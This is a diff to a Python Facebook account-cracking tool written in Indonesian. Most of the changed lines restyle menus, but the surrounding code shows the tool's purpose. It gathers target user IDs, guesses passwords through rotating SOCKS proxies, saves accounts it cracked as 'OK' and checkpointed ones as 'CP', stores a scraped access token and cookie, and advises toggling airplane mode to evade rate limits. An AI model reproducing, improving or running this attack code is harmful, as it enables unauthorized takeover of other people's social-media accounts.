@@ -405,7 +405,7 @@ def login_lagi334():
 		find_token = re.search("(EAAG\w+)", data.text)
 		ken=open(".token.txt", "w").write(find_token.group(1));bot()
 		cok=open(".cok.txt", "w").write(cookie)
-		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL DAN JALANKAN ULANG PERINTAHNYA{x} ');time.sleep(1)
+		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL, JALANKAN ULANG PERINTAHNYA{x} ');time.sleep(1)
 		exit()
 	except Exception as e:
 		os.system("rm -f .token.txt")
@@ -433,15 +433,15 @@ def menu(my_name,my_id):
 	ip = requests.get("https://api.ipify.org").text
 	gh = 'IlmanRamdhaniR'
 	cetak(nel('\tSELAMAT DATANG [yellow]%s[white]'%(my_name)))
-	print(f'├──> ID KAMU : '+str(my_id))
-	print(f'├──> IP KAMU : {ip}')
-	print(f'├──> GITHUB  : {gh}')
+	print(f'└──[ID KAMU : '+str(my_id))
+	print(f'└──[IP KAMU : {ip}')
+	print(f'└──[GITHUB  : {gh}')
 	print('|')
-	print('├──> 1. CRACK PUBLIK ')
-	print('├──> 2. HASIL CRACK  ')
-	print('├──> 3. KELUAR       ')
+	print('└──[1] CRACK PUBLIK ')
+	print('└──[2] HASIL CRACK  ')
+	print('└──[3] KELUAR       ')
 	print('|')
-	Ilman = input('\r├──> PILIH : ')
+	Ilman = input('\r└──PILIH : ')
 	if Ilman in ['1']:
 		dump_massal()
 	elif Ilman in ['2']:
@@ -449,30 +449,30 @@ def menu(my_name,my_id):
 	elif Ilman in ['3']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
-		print('├──> SUKSES LOGOUT/HAPUS COOKIES ')
+		print('└──SUKSES LOGOUT/HAPUS COOKIES ')
 		exit()
 	else:
-		print('├──> PILIH YANG BENAR ')
+		print('└──PILIH YANG BENAR ')
 		back()
 def error():
-	jalan(f'{sir}├──> TUNGGU SEBENTAR ANDA AKAN DIARAHKAN KE FACEBOOK  {x}')
+	jalan(f'{sir}└──TUNGGU SEBENTAR ANDA AKAN DIARAHKAN KE FACEBOOK  {x}')
 	time.sleep(4)
 	os.system("xdg-open https://www.facebook.com/IImanramdhanirahman")
 	back()
 #-----------------[ HASIL-CRACK ]-----------------#
 def result():
-	print(f'├──> 1. HASIL {h}OK{x} ANDA ')
-	print(f'├──> 2. HASIL {k}CP{x} ANDA ')
-	print('├──> 3. KEMBALI	')
-	kz = input(f'\n├──> PILIH : ')
+	print(f'└──[1] HASIL {h}OK{x} ANDA ')
+	print(f'└──[2] HASIL {k}CP{x} ANDA ')
+	print('└──[3] KEMBALI	')
+	kz = input(f'\n├└──PILIH : ')
 	if kz in ['2']:
 		try:vin = os.listdir('CP')
 		except FileNotFoundError:
-			print('▪︎ FILE TIDAK DITEMUKAN ')
+			print('└──FILE TIDAK DITEMUKAN ')
 			time.sleep(3)
 			back()
 		if len(vin)==0:
-			print('▪︎ ANDA TIDAK MEMILIKI HASIL CP ')
+			print('└──ANDA TIDAK MEMILIKI HASIL CP ')
 			time.sleep(2)
 			back()
 		else:
@@ -486,18 +486,18 @@ def result():
 					nom = ''+str(cih)
 					lol.update({str(cih):str(isi)})
 					lol.update({nom:str(isi)})
-					print(f'├──> %s. %s ({k} %s {x}ID )'%(nom,isi,len(hem)))
+					print(f'└──%s. %s ({k} %s {x}ID )'%(nom,isi,len(hem)))
 				else:
 					lol.update({str(cih):str(isi)})
 					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' ACCOUNT ]'+x)
 			geeh = input('\n▪︎ PILIH : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print('├──> PILIH YANG BENAR ')
+				print('└──PILIH YANG BENAR ')
 				back()
 			try:lin = open('CP/'+geh,'r').read().splitlines()
 			except:
-				print('├──> FILE TIDAK DITEMUKAN ')
+				print('└──FILE TIDAK DITEMUKAN ')
 				time.sleep(2)
 				back()
 			nocp=0
@@ -511,11 +511,11 @@ def result():
 	elif kz in ['1']:
 		try:vin = os.listdir('OK')
 		except FileNotFoundError:
-			print('▪︎ FILE TIDAK DITEMUKAN ')
+			print('└──FILE TIDAK DITEMUKAN ')
 			time.sleep(2)
 			back()
 		if len(vin)==0:
-			print('▪︎ ANDA TIDAK MEMILIKI HASIL OK ')
+			print('└──ANDA TIDAK MEMILIKI HASIL OK ')
 			time.sleep(2)
 			back()
 		else:
@@ -529,25 +529,25 @@ def result():
 					nom = '0'+str(cih)
 					lol.update({str(cih):str(isi)})
 					lol.update({nom:str(isi)})
-					print(f'├──> %s. %s ( {h}%s{x} ID )'%(nom,isi,len(hem)))
+					print(f'└── %s. %s ( {h}%s{x} ID )'%(nom,isi,len(hem)))
 				else:
 					lol.update({str(cih):str(isi)})
-					print(f'├──> %s. %s ({h} %s {x}ID )'%(cih,isi,(len(hem))))
-			geeh = input(f'\n PILIH : ')
+					print(f'└── %s. %s ({h} %s {x}ID )'%(cih,isi,(len(hem))))
+			geeh = input(f'\n└──PILIH : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print('├──> PILIH YANG BENAR ')
+				print('└──PILIH YANG BENAR ')
 				back()
 			try:lin = open('OK/'+geh,'r').read().splitlines()
 			except:
-				print(' FILE TIDAK DITEMUKAN ')
+				print('└──FILE TIDAK DITEMUKAN ')
 				time.sleep(2)
 				back()
 			nocp=0
 			for cpku in range(len(lin)):
 				cpkuni=lin[nocp].split('|')
 				print('')
-				print(f'{x}├──>{h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
+				print(f'{x}└──{h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
 				nocp +=1
 			print('')
 			input(f'{x}[{m} KLIK ENTER{x} ]')
@@ -555,7 +555,7 @@ def result():
 	elif kz in ['3']:
 		back()
 	else:
-		print('├──> PILIH YANG BENAR ')
+		print('└──PILIH YANG BENAR ')
 		back()
 #-------------------[ CRACK-PUBLIK ]----------------#
 def dump_massal():
@@ -565,18 +565,18 @@ def dump_massal():
 	except IOError:
 		exit()
 	try:
-		jum = int(input('├──> MAU BERAPA TARGET : '))
+		jum = int(input('└──MAU BERAPA TARGET [MAX 5] : '))
 	except ValueError:
-		print('├──> MASUKKAN ANGKA JANGAN HURUF ')
+		print('└──MASUKKAN ANGKA JANGAN HURUF ')
 		exit()
 	if jum<1 or jum>100:
-		print('├──> GAGAL MEMERIKSA ID ')
+		print('└──GAGAL MEMERIKSA ID ')
 		exit()
 	ses=requests.Session()
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		kl = input('├──> MASUKAN ID YANG KE '+str(yz)+' : ')
+		kl = input('└──MASUKAN ID YANG KE '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -590,27 +590,27 @@ def dump_massal():
 		except (KeyError,IOError):
 			pass
 		except requests.exceptions.ConnectionError:
-			print('├──> JARINGAN ERROR COBA LAGI ')
+			print('└──JARINGAN ERROR COBA LAGI ')
 			exit()
 	try:
 		print('|')
-		print(f'├──> TOTAL ID TARGET : {h}'+str(len(id)))
+		print(f'└──TOTAL ID TARGET : {h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
-		print('├──> JARINGAN ERROR COBA LAGI ')
+		print('└──JARINGAN ERROR COBA LAGI ')
 		back()
 	except (KeyError,IOError):
-		print(f'├──>{k} PERTEMANAN TIDAK PUBLIK {x}')
+		print(f'└──{k} PERTEMANAN TIDAK PUBLIK {x}')
 		time.sleep(3)
 		back()
 #-------------[ PENGATURAN-ID ]---------------#
 def setting():
-	print(f'{x}├──> 1. AKUN OLD ')
-	print('├──> 2. AKUN NEW ')
-	print('├──> 3. RANDOM ')
+	print(f'{x}└──[1] AKUN OLD ')
+	print('└──[2] AKUN NEW ')
+	print('└──[3] RANDOM ')
 	print('|')
-	hu = input('├──> PILIH : ')
+	hu = input('└──PILIH : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -631,12 +631,12 @@ def setting():
 	else:
 		print('├──> PILIH YANG BENAR ')
 		exit()
-	print('├──> 1. MOBILE FACEBOOK [RECOMENDED] ')
-	print('├──> 2. MBASIC FACEBOOK ')
+	print(f'└──[1] MOBILE FACEBOOK {h}[RECOMENDED]{x} ')
+	print(f'└──[2] MBASIC FACEBOOK {sir}[NOT RECOMENDED]{x} ')
 	###print('├──> 3. bbh  ')
 	###print('├──> 4. Mfreefb ')
 	print('|')
-	hc = input('├──> PILIH : ')
+	hc = input('└──PILIH : ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['2','02']:
@@ -648,19 +648,19 @@ def setting():
 	else:
 		method.append('mobile')
 	print('|')
-	_ilman_ = input('├──> INGIN MENAMPILKAN APLIKASI TERKAIT [ Y/T ] : ')
+	_ilman_ = input('└──INGIN MENAMPILKAN APLIKASI TERKAIT [ Y/T ] : ')
 	if _ilman_ in ['']:
-		print('├──> PILIH YANG BENAR ')
+		print('└──PILIH YANG BENAR ')
 		back()
 	elif _ilman_ in ['y','Y']:
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
-	pwplus=input('├──> INGIN MENAMBAHKAN PASSWORD MANUAL [ Y/T ] : ')
+	pwplus=input('└──INGIN MENAMBAHKAN PASSWORD MANUAL [ Y/T ] : ')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
 		cetak(nel('[[cyan]•[white]] MASUKAN KATA SANDI TAMBAHAN\n[[cyan]•[white]] CONTOH :[green] SAYANG,BISMILLAH,INDONESIA[white] '))
-		pwku=input('├──> MASUKAN PASSWORD TAMBAHAN : ')
+		pwku=input('└──MASUKAN PASSWORD TAMBAHAN : ')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
 			pwnya.append(xpw)
@@ -671,8 +671,8 @@ def setting():
 def passwrd():
 	print('|')
 	cetak(nel('\t[green]SEDANG PROSES CRACKING MOHON BERSABAR'))
-	print(f'├──> HASIL {h}OK{x} AKAN TERSIMPAN DI : {h}OK/%s {x}'%(okc))
-	print(f'├──> HASIL {k}CP{x} AKAN TERSIMPAN DI : {k}CP/%s {x}'%(cpc))
+	print(f'└──HASIL {h}OK{x} AKAN TERSIMPAN DI : {h}OK/%s {x}'%(okc))
+	print(f'└──HASIL {k}CP{x} AKAN TERSIMPAN DI : {k}CP/%s {x}'%(cpc))
 	cetak(nel('\t[green]SETIAP 500 ID MAINKAN MODE PESAWAT [white]10 DETIK'))
 	print('|')
 	print('|')
@@ -718,7 +718,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r├──> 🐦 {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
+	sys.stdout.write(f"\r└──[ILMAN] 🐦 {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
 	sys.stdout.flush()
 	nip=random.choice(prox)
 	proxs= {'http': 'socks4://'+nip}
@@ -758,7 +758,7 @@ def crack(idf,pwv):
 def crackfree(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r├──> 🐦 {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
+	sys.stdout.write(f"\r└──[ILMAN] 🐦 {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
 	sys.stdout.flush()
 	nip=random.choice(prox)
 	proxs= {'http': 'socks5://'+nip}
